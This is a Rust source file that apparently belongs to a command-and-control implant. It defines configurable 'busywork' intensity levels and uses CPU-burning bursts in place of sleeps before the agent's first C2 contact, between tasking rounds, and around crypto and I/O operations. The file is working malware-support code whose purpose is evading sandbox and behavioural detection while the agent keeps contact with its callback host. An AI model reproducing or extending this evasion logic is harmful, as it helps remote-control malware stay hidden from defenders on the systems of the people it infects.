use std::hint::black_box;
use crate::config;
use busywork::{BusyWork, Intensity, FeedWork};

/// Parsed busywork level. `"off"` / `"none"` skips computational delay entirely.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Level {
    Off,
    Low,
    Medium,
    High,
    Ultra,
}

fn level() -> Level {
    match config::busywork_intensity {
        "off" | "none" | "disabled" => Level::Off,
        "low" => Level::Low,
        "high" => Level::High,
        "ultra" => Level::Ultra,
        // "medium" and any unknown value default to Medium
        _ => Level::Medium,
    }
}

fn to_intensity(l: Level) -> Option<Intensity> {
    match l {
        Level::Off => None,
        Level::Low => Some(Intensity::Low),
        Level::Medium => Some(Intensity::Medium),
        Level::High => Some(Intensity::High),
        Level::Ultra => Some(Intensity::Ultra),
    }
}

/// Startup delay before first C2 contact — uses the configured intensity.
pub fn startup_delay() {
    let l = level();
    crate::dlog!(
        "startup_delay: configured={} resolved={:?}",
        config::busywork_intensity,
        l
    );
    let Some(i) = to_intensity(l) else {
        crate::dlog!("startup_delay: skipped (off)");
        return;
    };
    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(i)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .feed(config::user_agent)
            .run(),
    );
    crate::dlog!("startup_delay: done");
}

/// Sleep replacement between tasking rounds.
///
/// Three BusyWork bursts at the configured intensity, with short sleeps
/// between them so the agent still yields the CPU periodically.
pub fn idle() {
    let l = level();
    let Some(i) = to_intensity(l) else {
        std::thread::sleep(std::time::Duration::from_millis(200));
        return;
    };
    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(i)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .run(),
    );
    std::thread::sleep(std::time::Duration::from_millis(200));
    black_box(
        BusyWork::new(i)
            .feed(config::user_agent)
            .feed(uuid.as_str())
            .run(),
    );
    std::thread::sleep(std::time::Duration::from_millis(200));
    black_box(
        BusyWork::new(i)
            .feed(config::callback_host)
            .feed(config::user_agent)
            .feed(uuid.as_str())
            .run(),
    );
}

/// Lightweight behavioral noise around crypto / I/O.
///
/// Capped at Medium so High/Ultra agents do not starve tasking with a full
/// burst after every small operation.
pub fn churn(data: &(impl FeedWork + ?Sized)) {
    let Some(i) = to_intensity(level()) else {
        return;
    };
    let i = match i {
        Intensity::High | Intensity::Ultra => Intensity::Medium,
        other => other,
    };
    black_box(BusyWork::new(i).feed(data).run());
}
